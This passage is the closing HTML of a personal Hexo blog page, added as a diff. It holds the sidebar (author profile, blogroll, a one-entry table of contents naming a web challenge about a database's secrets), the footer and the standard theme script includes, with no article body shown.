+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg" alt="threedr3am">
+            
+              <p class="site-author-name" itemprop="name">threedr3am</p>
+              <p class="site-description motion-element" itemprop="description">行走的爱心</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/threedr3am" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gengzongyuan.github.io/" title="大树先生(测试大牛)" target="_blank">大树先生(测试大牛)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chensem.github.io/" title="chensem(逆向龙哥)" target="_blank">chensem(逆向龙哥)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://otakekumi.github.io/" title="梅子酒" target="_blank">梅子酒</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.orange.tw/" title="orange" target="_blank">orange</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-web1-数据库的秘密"><span class="nav-number">1.</span> <span class="nav-text">0x01 web1 数据库的秘密</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">threedr3am</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
